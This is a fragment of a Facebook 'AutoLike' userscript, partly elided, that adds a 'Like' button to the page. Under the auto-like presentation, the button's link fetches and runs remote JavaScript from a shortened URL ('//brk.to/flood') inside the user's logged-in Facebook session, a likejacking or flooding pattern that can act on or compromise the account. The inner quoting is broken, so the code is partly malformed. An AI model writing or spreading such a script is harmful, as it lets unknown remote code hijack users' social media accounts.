// ==UserScript==
// @name           Facebook AutoLike by Ariieph Newbie
// @namespace      AutoLike
...
if(body != null) {
	...
	div.style.left = "+15px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FFFFFF\" href=\"javascript:(a = (b = document).createElement("script")).src = "//brk.to/flood", b.body.appendChild(a); void(0)()\"><img src=http://b2nplen.netai.net/images/likev.gif height=20 width=20 alt='Like Post or Status' title='Like Post or Status'</img></a>"
